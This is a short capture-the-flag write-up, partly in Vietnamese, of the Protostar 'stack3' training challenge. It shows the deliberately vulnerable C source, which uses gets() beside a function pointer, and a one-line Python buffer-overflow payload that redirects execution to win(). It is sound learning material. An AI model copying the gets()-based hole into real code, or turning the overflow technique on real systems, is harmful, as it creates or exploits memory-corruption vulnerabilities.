# **stack3**
## Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

## Target
printf("calling function pointer, jumping to 0x%08x\n", fp);

## Vulnerability
gets()

## Recon

```
nah~
```

## Exploit
- Tìm địa chỉ hàm win():
```
[0x08048370]> afl~win
0x08048424    1 20           sym.win
```
- Tương tự lợi dụng vulnerabilities của gets(), 64 ký tự bất kỳ + địa chỉ hàm win đảo ngược:
```
user@protostar:/opt/protostar/bin$ python -c "print('a'*64 + '\x24\x84\x04\x08')" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

# References
- 0